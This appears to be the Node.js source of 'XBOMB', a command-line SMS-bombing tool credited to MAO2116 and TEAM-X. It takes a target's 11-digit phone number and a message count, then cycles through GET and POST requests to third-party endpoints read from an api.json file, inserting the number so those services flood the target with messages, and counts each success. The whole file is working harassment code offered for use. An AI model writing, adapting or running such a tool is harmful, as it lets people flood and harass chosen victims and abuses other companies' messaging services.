const fs = require('fs');
const figlet = require('figlet');
const request = require("axios");
const {exec}    = require("child_process");
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});



let main = async () => {
  figlet.text('XBOMB', {
    font: 'Slant',
    horizontalLayout: 'default',
    verticalLayout: 'default',
    width: 80,
    whitespaceBreak: true
}, function(err, data) {
  if (err) {
        console.log('XBOMB LOGO ! \n [ CODER ] MAO2116\n[ MADE WITH ] TEAM-X');
        console.dir(err);
        return;
    }
   exec("clear",(maoerr,maoclear) =>{
     
  console.log(maoclear+"\x1b[1;33m"+data+"\n   \x1b[1;30m[ \x1b[1;36m CODED BY \x1b[1;30m]\x1b[1;35m MAO2116\n   \x1b[1;30m[ \x1b[1;34mMAKE WITH \x1b[1;30m]\x1b[1;35m TEAM-X\n\n");
  readline.question(`\x1b[1;32mENTER NUMBER \x1b[1;30m:\x1b[1;33m `,number=>{
    if(number=="mao2116" || number=="MAO2116"){
      exec("xdg-open https://github.com/mao2116");
      process.exit(1);
    }else if( number=="team-x" || number=="TEAM-X"){
      //
      exec("xdg-open https://github.com/WeAreTeamX");
      process.exit(1);
    }else{
	if(number.length == 11){
			//pass
		}else{
			console.log("NUMBER MUST BE 11 DIGIT")
			process.exit(1);
			}
	}
    readline.question("\x1b[1;32mENTER AMOUNT \x1b[1;30m:\x1b[1;33m ", amunt=>{
     fs.readFile("api.json","utf8",(err,data)=>{
    data=JSON.parse(data);
   

   let num=0;
   let bombcnt=0;
   bombinnots=0;
   for (var i = 0; i < amunt; i++) {
     
     if((data["api"][num])["method"]=="get" || (data["api"][num])["method"]=="GET"){
      
      let url=data["api"][num]["url"].replace("{maonumber}",number)
     request({
       url:url,
       method:data["api"][num]["method"],
       headers:data["api"][num]["headers"]
     }).then(requ =>{
       if (requ.status==200 || requ.status=="200") {
         bombcnt = bombcnt+1
         console.log(`\x1b[1;30m[ \x1b[1;34m${bombcnt}\x1b[1;30m ]\x1b[1;32m MESSAGE SENT SUCCESSFULLY \x1b[1;30m!`)
       }else{
         bombinnots=bombinnots+1
         console.log(`\x1b[1;30m[ \x1b[1;34m${bombinnots}\x1b[1;30m ]\x1b[1;31m MESSAGE NOT SUCCESSFULLY \x1b[1;30m!`)
       }
     }).catch( err =>{
       bombinnots=bombinnots+1
         console.log(`\x1b[1;30m[ \x1b[1;34m${bombinnots}\x1b[1;30m ]\x1b[1;31m MESSAGE NOT SUCCESSFULLY \x1b[1;30m!`)
     });
     
       
     }else if((data["api"][num])["method"]=="post" || (data["api"][num])["method"]=="POST"){
       
       let url=data["api"][num]["url"].replace("{maonumber}",number)
       
       let databody=data["api"][num]["data"].replace("{maonumber}",number)
       request({
       url:url,
        method: data["api"][num]["method"],
        headers : data["api"][num]["headers"],
        data:databody
       
     }).then(requ =>{
       if (requ.status==200 || requ.status=="200") {
         bombcnt = bombcnt+1
         console.log(`\x1b[1;30m[ \x1b[1;34m${bombcnt}\x1b[1;30m ]\x1b[1;32m MESSAGE SENT SUCCESSFULLY \x1b[1;30m!`)
       }else{
         bombinnots=bombinnots+1
         console.log(`\x1b[1;30m[ \x1b[1;34m${bombinnots}\x1b[1;30m ]\x1b[1;31m MESSAGE NOT SUCCESSFULLY \x1b[1;30m!`)
       }

     }).catch( err =>{
       bombinnots=bombinnots+1
         console.log(`\x1b[1;30m[ \x1b[1;34m${bombinnots}\x1b[1;30m ]\x1b[1;31m MESSAGE NOT SUCCESSFULLY \x1b[1;30m!`)
     });
       
       //
     }else{
       //
     }
     num++
     if(num==data["api"].length){
       num=0;
     }
   };
   readline.close();
}

)
     
    })
  })
})
})};

main();
